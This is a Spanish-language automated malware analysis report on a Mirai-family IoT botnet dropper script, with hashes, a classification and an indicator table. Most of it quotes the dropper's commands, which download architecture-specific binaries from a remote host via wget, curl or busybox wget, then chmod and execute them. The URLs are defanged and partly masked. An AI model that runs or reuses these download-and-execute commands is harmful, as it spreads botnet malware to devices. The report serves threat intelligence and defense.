# 🧬 Payload Analysis

`98f2c4fb37c76064c318695e568d9768edd9ea298b132166692a972e2e492b52`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se identificaron 29 comandos observados o extraídos. Se identificaron 43 indicadores técnicos. **Perfil técnico:** `Linux embebido / IoT` (probable). La presencia de BusyBox, junto con la evidencia de familia Mirai, es consistente con malware orientado a sistemas embebidos e IoT. **Ficha malware:** [malware-like/oraculo/botnet/98f2c4fb37c76064c318695e568d9768edd9ea298b132166692a972e2e492b52.md](../../../../../malware-like/oraculo/botnet/98f2c4fb37c76064c318695e568d9768edd9ea298b132166692a972e2e492b52.md)


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:00:23.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `98f2c4fb37c76064c318695e568d9768edd9ea298b132166692a972e2e492b52`
- **SHA1:** `ea4e10a430c53af6d75bc9227b99400440dcd0f2`
- **MD5:** `8c3915139f2d87bee0373f3eb687a5db`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF, LF line terminators |
| Tamaño | 4.0 KiB |
| Entropía | 5.1 |
| Strings | 59 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF, LF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.m68k; chmod 777 vcimanagement.m68k; ./vcimanagement.m68k android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mips; chmod 777 vcimanagement.mips; ./vcimanagement.mips android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; chmod 777 vcimanagement.mpsl; ./vcimanagement.mpsl android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vcimanagement.spc; ./vcimanagement.spc android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.x86; chmod 777 vcimanagement.x86; ./vcimanagement.x86 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.x86_64; chmod 777 vcimanagement.x86_64; ./vcimanagement.x86_64 andr
curl hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android
curl hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.m68k; chmod 777 vcimanagement.m68k; ./vcimanagement.m68k android
curl hxxp://141.11.88.XXX/bins/vcimanagement.mips; chmod 777 vcimanagement.mips; ./vcimanagement.mips android
curl hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; chmod 777 vcimanagement.mpsl; ./vcimanagement.mpsl android
curl hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android
curl hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vcimanagement.spc; ./vcimanagement.spc android
curl hxxp://141.11.88.XXX/bins/vcimanagement.x86; chmod 777 vcimanagement.x86; ./vcimanagement.x86 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.x86_64; chmod 777 vcimanagement.x86_64; ./vcimanagement.x86_64 android
wget hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android
wget hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android
wget hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android
wget hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android
wget hxxp://141.11.88.XXX/bi
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm7; | strings |
| url | hxxp://141.11.88.XXX/bi | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.ppc; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.sh4; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.m68k; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm6; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.mips; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.x86_64; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.x86; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm5; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.spc; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm; | strings |
| ip | 141.11.88.XXX | static_analysis |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.m68k; chmod 777 vcimanagement.m68k; ./vcimanagement.m68k android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mips; chmod 777 vcimanagement.mips; ./vcimanagement.mips android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; chmod 777 vcimanagement.mpsl; ./vcimanagement.mpsl android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vcimanagement.spc; ./vcimanagement.spc android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.x86; chmod 777 vcimanagement.x86; ./vcimanagement.x86 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.x86_64; chmod 777 vcimanagement.x86_64; ./vcimanagement.x86_64 andr | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.m68k; chmod 777 vcimanagement.m68k; ./vcimanagement.m68k android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.mips; chmod 777 vcimanagement.mips; ./vcimanagement.mips android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; chmod 777 vcimanagement.mpsl; ./vcimanagement.mpsl android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vcimanagement.spc; ./vcimanagement.spc android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.x86; chmod 777 vcimanagement.x86; ./vcimanagement.x86 android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.x86_64; chmod 777 vcimanagement.x86_64; ./vcimanagement.x86_64 android | strings |
| command | wget hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android | strings |
| command | wget hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android | strings |

Conjunto completo: [`iocs.json`](iocs.json) (44 indicadores).

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | html response |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
